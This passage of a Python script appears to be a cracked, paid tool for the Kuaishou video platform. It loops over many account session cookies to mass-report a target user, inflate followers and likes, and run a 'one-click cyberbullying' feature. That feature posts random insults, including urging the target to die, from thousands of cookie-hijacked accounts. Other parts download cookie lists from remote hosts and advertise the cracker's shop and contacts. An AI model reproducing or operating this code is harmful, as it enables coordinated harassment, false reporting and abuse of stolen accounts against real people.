        data = response31.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response32 = requests.post(url, data=payload, headers=headers34)
    if yuluoyyds in response32.text:
        print(green + '32' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('32', red + '举报失败' + redd)
        data = response32.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response33 = requests.post(url, data=payload, headers=headers35)
    if yuluoyyds in response33.text:
        print(green + '33' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('33', red + '举报失败' + redd)
        data = response33.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response34 = requests.post(url, data=payload, headers=headers36)
    if yuluoyyds in response34.text:
        print(green + '34' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('34', red + '举报失败' + redd)
        data = response34.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response35 = requests.post(url, data=payload, headers=headers37)
    if yuluoyyds in response35.text:
        print(green + '35' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('35', red + '举报失败' + redd)
        data = response35.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response36 = requests.post(url, data=payload, headers=headers38)
    if yuluoyyds in response36.text:
        print(green + '36' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('36', red + '举报失败' + redd)
        data = response36.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response37 = requests.post(url, data=payload, headers=headers39)
    if yuluoyyds in response37.text:
        print(green + '37' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('37', red + '举报失败' + redd)
        data = response37.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response38 = requests.post(url, data=payload, headers=headers40)
    if yuluoyyds in response38.text:
        print(green + '38' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('38', red + '举报失败' + redd)
        data = response38.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response39 = requests.post(url, data=payload, headers=headers41)
    if yuluoyyds in response39.text:
        print(green + '39' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('39', red + '举报失败' + redd)
        data = response39.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response40 = requests.post(url, data=payload, headers=headers42)
    if yuluoyyds in response40.text:
        print(green + '40' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('40', red + '举报失败' + redd)
        data = response40.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response41 = requests.post(url, data=payload, headers=headers43)
    if yuluoyyds in response41.text:
        print(green + '41' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('41', red + '举报失败' + redd)
        data = response41.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response42 = requests.post(url, data=payload, headers=headers44)
    if yuluoyyds in response42.text:
        print(green + '42' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('42', red + '举报失败' + redd)
        data = response42.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response43 = requests.post(url, data=payload, headers=headers45)
    if yuluoyyds in response43.text:
        print(green + '43' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('43', red + '举报失败' + redd)
        data = response43.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response44 = requests.post(url, data=payload, headers=headers46)
    if yuluoyyds in response44.text:
        print(green + '44' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('44', red + '举报失败' + redd)
        data = response44.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response45 = requests.post(url, data=payload, headers=headers47)
    if yuluoyyds in response45.text:
        print(green + '45' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('45', red + '举报失败' + redd)
        data = response45.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response46 = requests.post(url, data=payload, headers=headers48)
    if yuluoyyds in response46.text:
        print(green + '46' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('46', red + '举报失败' + redd)
        data = response46.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response47 = requests.post(url, data=payload, headers=headers49)
    if yuluoyyds in response47.text:
        print(green + '47' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('47', red + '举报失败' + redd)
        data = response47.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response48 = requests.post(url, data=payload, headers=headers50)
    if yuluoyyds in response48.text:
        print(green + '48' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('48', red + '举报失败' + redd)
        data = response48.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response49 = requests.post(url, data=payload, headers=headers51)
    if yuluoyyds in response49.text:
        print(green + '49' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('49', red + '举报失败' + redd)
        data = response49.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response50 = requests.post(url, data=payload, headers=headers52)
    if yuluoyyds in response50.text:
        print(green + '50' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('50', red + '举报失败' + redd)
        data = response50.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response51 = requests.post(url, data=payload, headers=headers53)
    if yuluoyyds in response51.text:
        print(green + '51' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('51', red + '举报失败' + redd)
        data = response51.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response52 = requests.post(url, data=payload, headers=headers54)
    if yuluoyyds in response52.text:
        print(green + '52' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('52', red + '举报失败' + redd)
        data = response52.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response53 = requests.post(url, data=payload, headers=headers55)
    if yuluoyyds in response53.text:
        print(green + '53' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('53', red + '举报失败' + redd)
        data = response53.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response54 = requests.post(url, data=payload, headers=headers56)
    if yuluoyyds in response54.text:
        print(green + '54' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('54', red + '举报失败' + redd)
        data = response53.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    if response.status_code == 200:
        data = response0.json()
        print('举报成功,状态码：', response0.status_code)
        print('响应体：', green + (response0.content.decode("utf-8")) + redd)
        print('举报理由：', red + (LY) + redd)
    else:
        print('举报失败:', red + (response0.status_code) + redd)
    zh = '账号状态：'
    if '"TA"' in response0.text:
        print(zh, red + '对方已封号' + redd)
    else:
        print(zh, red + '处理中' + redd)
        yyds = response0.text

    yuluoyyds = '"result":1,"'
    data = response0.json()  # 获取name的值
    if yuluoyyds in response0.text:
        gggg = data["reportedUser"]
        bbbb = data['reportedUser']
        ggggg = gggg["user_name"]

        print("对面名称：", red + ggggg + redd)

    else:
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)
    if 'user_sex' in response0.text:
        aaaaa = gggg["user_sex"]
    if aaaaa == "M":
        print("对方性别：", red + "公" + redd)
    elif aaaaa == "U":
        print("对方性别：", red + "母" + redd)
    else:
        print("对方性别：", red + "未知" + redd)
    if 'kwaiid' in response0.text:
        bbbbb = bbbb['kwaiId']
        print("对面原ID：", red + bbbbb + redd)
    else:
        print("对面原ID：", red + '未知' + redd)


def main_menu8():
    import requests
    import webbrowser
    print(
        green + '伏笔牛逼' + redd)

    def main():

        try:
            print('请使用最新复制的链接，防止解析失败')
            lj = input('输入作品链接:')
            response = requests.get('https://api.kxzjoker.cn/API/jiexi_video.php?url=' + (lj))
            response.raise_for_status()
            data = response.json()
            if data.get("success"):
                video_title = data.get("data", {}).get("video_title", "未知文案")
                video_url = data.get("data", {}).get("video_url", "未知视频链接")
                image_url = data.get("data", {}).get("image_url", "未知封面链接")
                print(f"文案：{video_title}")
                print(f"视频链接：{video_url}")
                print(f"封面链接：{image_url}")
                iiii = ''.join([i.strip('') for i in video_url])
                iiiii = ''.join([i.strip('') for i in video_url])
                print(iiii)
                zz = input('输入[1]跳转视频链接/[2]跳转封面链接')
                if zz == "1":
                    url = iiii
                    webbrowser.open_new(url)

                elif zz == "2":
                    url = iiiii
                    webbrowser.open_new(url)

                return video_title, video_url, image_url
            else:
                print("解析失败：", data.get("message"))
                return None, None, None
        except requests.RequestException as e:
            print(f"请求失败：{e}")
            return None, None, None

    if __name__ == "__main__":
        main()


def main_menu9():
    import requests
    import re
    import json
    import time
    import urllib.request
    import os
    import random
    bai = "\033[3m"
    hx = "\033[4m"
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    print(
        green + '伏笔牛逼' + redd)

    time_tuple = time.localtime(time.time())
    A = "{}.{}.{}『{}:{}:{}』".format(time_tuple[0], time_tuple[1], time_tuple[2], time_tuple[3], time_tuple[4],
                                    time_tuple[5])

    page = requests.get('https://www.ipip.net/ip-js/')
    ss = (page.text)
    f = re.findall('[\u4e00-\u9fa5]', ss)
    f = ''.join([i for i in f if i != ' '])

    from urllib.parse import quote
    text = f
    encoded_text = quote(text)
    f = encoded_text
    ff = (f.replace('%E4%B8%AD%E5%9B%BD', '%5B%3A513%5D'))
    from urllib.parse import quote
    text1 = A
    encoded_text1 = quote(text1)
    A = encoded_text1

    urlc = "https://api.pearktrue.cn/api/hitokoto/"
    responsec = requests.get(urlc)
    print(responsec.text)
    page = requests.get('https://share.weiyun.com/183vf7EV')
    req = requests.get("http://txt.go.sohu.com/ip/soip")
    ip = re.findall('window.sohu_user_ip="(.*?)";', req.text)[0]
    if ip in page.text:
        print('你已被作者列入黑名单')
        exit()
    url66666 = "http://tool.pfan.cn/shorturl/restore"
    yul = input('输入作品链接：')
    yul = re.findall('https://v.kuaishou.com/(.*?) ', yul)  # 取值
    yul = ''.join([i.strip('') for i in yul])
    yul = 'https://v.kuaishou.com/' + yul
    if yul == "https://v.kuaishou.com/":
        print("输入的链接有误")
        print("提示:链接需要带文案")
        exit()
    print('链接为' + yul)

    from urllib.parse import quote
    text = yul
    encoded_text = quote(text)
    yull = encoded_text
    aaaaaaaa = 'shorturl='
    aaaaaaaaa = aaaaaaaa + yull
    payload66666 = aaaaaaaaa

    headers66666 = {
        'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    response66666 = requests.post(url66666, data=payload66666, headers=headers66666)
    a1 = response66666.text
    a111 = re.findall('&photoId=(.*?)&', a1)  # 取值
    a222 = re.findall('&userId=(.*?)&', a1)  # 取值
    a1111 = ''.join([i.strip('') for i in a111])  # 去括号
    a2222 = ''.join([i.strip('') for i in a222])  # 去括号
    print('作者ID：' + a1111)
    print('作品ID：' + a2222)

    url = "https://www.kuaishou.com/graphql"

    yulll = (yul.replace('https://v.kuaishou.com/', ''))

    from urllib.parse import quote
    sent = 0
    with open("Cookie.txt", "r") as file:
        phone_numbers = file.readlines()
    import multiprocessing
    # 核验Cookie
    while phone_numbers:

        for sent in range(9999):

            Cookie = phone_numbers[0].strip()
            Cookie = Cookie.replace("ⅰ", "i")
            values = ['臭标子', '废物', '脑瘫。', '乐子东西赶紧去s', '垃圾作品赶紧删了', '傻孩子', '傻']
            pinl = (str(random.choice(values)))
            payload = json.dumps({
                "operationName": "visionAddComment",
                "variables": {
                    "photoId": a1111,
                    "content": pinl,
                    "photoAuthorId": a2222
                },
                "query": "mutation visionAddComment($photoId: String, $photoAuthorId: String, $content: String, $replyToCommentId: ID, $replyTo: ID, $expTag: String) {\n  visionAddComment(photoId: $photoId, photoAuthorId: $photoAuthorId, content: $content, replyToCommentId: $replyToCommentId, replyTo: $replyTo, expTag: $expTag) {\n    result\n    commentId\n    content\n    timestamp\n    status\n    __typename\n  }\n}\n"
            })
            with open('Cookie.txt', 'r') as file:
                lines = file.readlines()
            num_lines = len(lines)
            zhsl = (red + str(num_lines) + redd)
            headers = {
                'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "identity",
                'accept-language': "zh-CN",
                'Charsert': "utf-8",
                'Content-Type': "application/json; charset=utf-8",
                'Cookie': Cookie
            }
            yuluoyyds = '"result":1'
            response = requests.post(url, data=payload, headers=headers)
            id_found = yuluoyyds in response.text
            Cookie9999 = re.findall('userId=(.*?); kuaishou.server.web_st', Cookie)  # 取值
            Cookie99999 = (('账号') + (red + str(Cookie9999) + redd))
            if id_found:
                print((sent), (Cookie99999), (green + "：✔评论成功") + redd, ("接口剩余"), (zhsl), pinl)
            else:
                print((sent), (Cookie99999), (red + "：❌评论失败") + redd, ("接口剩余"), (zhsl), pinl)
            del phone_numbers[0]
            with open("Cookie.txt", "w") as file:
                for phone in phone_numbers:
                    file.write(phone)
            processes = []
            for _ in range(1):
                p = multiprocessing.Process()
                processes.append(p)
                p.start()

                # 等待所有进程完成
            for p in processes:
                p.join()


def main_daoru():
    import os
    import requests
    import re
    import json
    import time
    import urllib.request
    import os
    bai = "\033[3m"
    hx = "\033[4m"
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    url = "https://api.ahfi.cn/api/qqcollection"
    page = requests.get('https://share.weiyun.com/183vf7EV')
    xzh = re.findall('接口数量【(.*?)】', page.text)  # 取值
    xzh = ''.join([i.strip('') for i in xzh])  # 去括号
    xzh = (red + xzh + redd)
    gg = re.findall('线路状态【(.*?)】', page.text)  # 取值
    gg = ''.join([i.strip('') for i in gg])  # 去括号
    gg = (green + gg + redd)

    params = {
        'url': "https://sharechain.qq.com/8543b8e18a29ef970ed8a22088709f92"
    }
    params2 = {
        'url': "https://sharechain.qq.com/8254f6b4afc3d993019e2f31d15cb1bc"
    }
    response = requests.get(url, params=params)
    response2 = requests.get(url, params=params2)
    a1 = response.json()
    a2 = response2.json()
    a11 = (a1['data']['summary']['brief'])
    a22 = (a2['data']['summary']['brief'])
    a111 = re.findall('1【(.*?)】', a11)  # 取值
    a222 = re.findall('2【(.*?)】', a11)  # 取值
    a333 = re.findall('3【(.*?)】', a22)  # 取值
    a1111 = ''.join([i.strip('') for i in a111])  # 去括号
    a2222 = ''.join([i.strip('') for i in a222])  # 去括号
    a3333 = ''.join([i.strip('') for i in a333])  # 去括号
    a4444 = ('http://wpan.cdndns.site/down/')
    if os.path.exists('Cookie.txt'):
        print()
    else:
        print('接口文件不存在')
        filename = 'Cookie.txt'
        print('正在下载资源(请等待5-20s)')
        print('默认下载线路1接口')
        urllib.request.urlretrieve(a1111, filename)
    with open('Cookie.txt', 'r') as file:
        lines = file.readlines()
    num_lines = len(lines)
    zhsl = (red + str(num_lines) + redd)
    zhsll = (red + xzh + redd)
    print("接口现数量:", zhsl)
    print("接口总数量:", zhsll)
    print('线路状态:', hx + gg + redd)
    if zhsl != zhsll:

        sfdr = input('是否重新导入接口(是:y/否:n):')
        if sfdr == 'y':
            print(
                '[1]:线路一(赞阁同款)\n[2]:线路二(火赞同款)\n[3]:线路三(秒赞同款)\n[4]:精选线路\n(精选线路卡密需另外购买)')
            xl = input('选择导入的线路(输入:1或2或3或4):')
            if xl == '1':
                page = requests.get('https://share.weiyun.com/183vf7EV')
                if '线路1开关状态【关】' in page.text:
                    print('线路状态：', (red + '维护' + redd))
                    exit()
                else:
                    filename = 'Cookie.txt'
                    print('正在下载线路1接口，请稍等(约5s-20s)')
                    urllib.request.urlretrieve(a1111, filename)
                    with open('Cookie.txt', 'r') as file:
                        lines = file.readlines()
                    num_lines = len(lines)
                    zhsl = (red + str(num_lines) + redd)
                    print('接口导入成功，现接口为:', zhsl)
            elif xl == '2':
                page = requests.get('https://share.weiyun.com/183vf7EV')
                if '线路2开关状态【关】' in page.text:
                    print('线路状态：', (red + '维护' + redd))
                    exit()
                else:

                    filename = 'Cookie.txt'
                    print('正在下载线路2接口，请稍等(约5s-20s)')
                    urllib.request.urlretrieve(a2222, filename)
                    with open('Cookie.txt', 'r') as file:
                        lines = file.readlines()
                    num_lines = len(lines)
                    zhsl = (red + str(num_lines) + redd)
                    print('接口导入成功，现接口为:', zhsl)
            elif xl == '3':
                page = requests.get('https://share.weiyun.com/183vf7EV')
                if '线路3开关状态【关】' in page.text:
                    print('线路状态：', (red + '维护' + redd))
                    exit()
                else:

                    filename = 'Cookie.txt'
                    print('正在下载线路3接口，请稍等(约5s-20s)')
                    urllib.request.urlretrieve(a3333, filename)
                    with open('Cookie.txt', 'r') as file:
                        lines = file.readlines()
                    num_lines = len(lines)
                    zhsl = (red + str(num_lines) + redd)
                    print('接口导入成功，现接口为:', zhsl)
            elif xl == '4':
                jx = input('输入精选接口卡密：')
                length = len(jx)
                if length < 20:
                    print('卡密无效')
                    exit()
                if '线路4开关状态【关】' in page.text:
                    print('线路状态：', (red + '维护' + redd))
                    exit()
                else:
                    filename = 'Cookie.txt'
                    print('正在下载备用接口，请稍等(约5s-20s)')
                    urllib.request.urlretrieve(a4444 + jx, filename)
                    with open('Cookie.txt', 'r') as file:
                        lines = file.readlines()
                    num_lines = len(lines)
                    zhsl = (red + str(num_lines) + redd)
                    print('接口导入成功，现接口为:', zhsl)
                    print(bai + ('错误的卡密会导致接口数量为1') + redd)
        else:
            print(hx + '继续使用剩余接口' + redd)


if __name__ == "__main__":
    CheckUpData()
    Notice()
    page = requests.get('https://share.weiyun.com/183vf7EV')
    if '卡密开关状态【开】' in page.text:
        print('[1]VIP版刷粉丝(1500~3000粉)\n[2]公益刷粉丝(防泛滥公益版不提供)')
        print('[3]VIP版刷评论(1500~3000评)\n[4]公益刷评论(10~30评)')
        print('[5]VIP版刷点赞(1500~3000赞)\n[6]公益刷点赞(10~30赞)')
        print('[7]VIP版刷举报(独家)\n[8]快手视频解析(无水印保存作品)')
        print('[9]VIP版一键网暴')
        print('\n')
        print('注：接口需维护时，永久卡用户可优先使用脚本备用接口')
        print('\n')
        print(bold_green +'伏笔已经给你破解了 伏笔卡网 https://fubi.lol')
        print('\n\n')
        xuanz = input(redd + '选择使用的功能1/2/3/4/5/6/7/8/9 | >')
        if xuanz == "1":
            main_daoru()
            Login1 = input('请输入卡密：')
            Login(Login1, '72862')
        elif xuanz == "2":
            print("高级功能仅支持vip用户/n你可使用公益评论或点赞")
        elif xuanz == "3":
            main_daoru()
            Login1 = input('请输入卡密：')
            Login3(Login1, '72862')
        elif xuanz == "4":
            page = requests.get('https://share.weiyun.com/183vf7EV')
            if '脚本开关状态【关】' in page.text:
                print('脚本状态：', (red + '脚本维护' + redd))
                exit()
            else:
                print(green + '脚本正常开放' + redd)
                main_menu4()
        elif xuanz == "5":
            main_daoru()
            Login1 = input('请输入卡密：')
            Login5(Login1, '72862')
        elif xuanz == "6":
            page = requests.get('https://share.weiyun.com/183vf7EV')
            if '脚本开关状态【关】' in page.text:
                print('脚本状态：', (red + '脚本维护' + redd))
                exit()
            else:
                print(green + '脚本正常开放' + redd)
                main_menu6()
        elif xuanz == "7":
            Login1 = input('请输入卡密：')
            Login7(Login1, '72862')
        elif xuanz == "8":
            main_menu8()
        elif xuanz == "9":
            main_daoru()
            Login1 = input('请输入卡密：')
            Login9(Login1, '72862')
        else:
            print("傻逼 赶紧滚")
    else:
        YULUO_KSQIANDAO()
    for i in range(1000000):
        sum += i
    end_time = time.time()
    print('\n')
    print(bold_green + '伏笔破解 😈 \n 卡网：https://fubi.lol \n QQ 107238503  \n TG:@Lysss123456 \n \n')
    print("程序共执行了%f秒" % (end_time - start_time))
    input(bold_red+'伏笔提醒：回车键退出')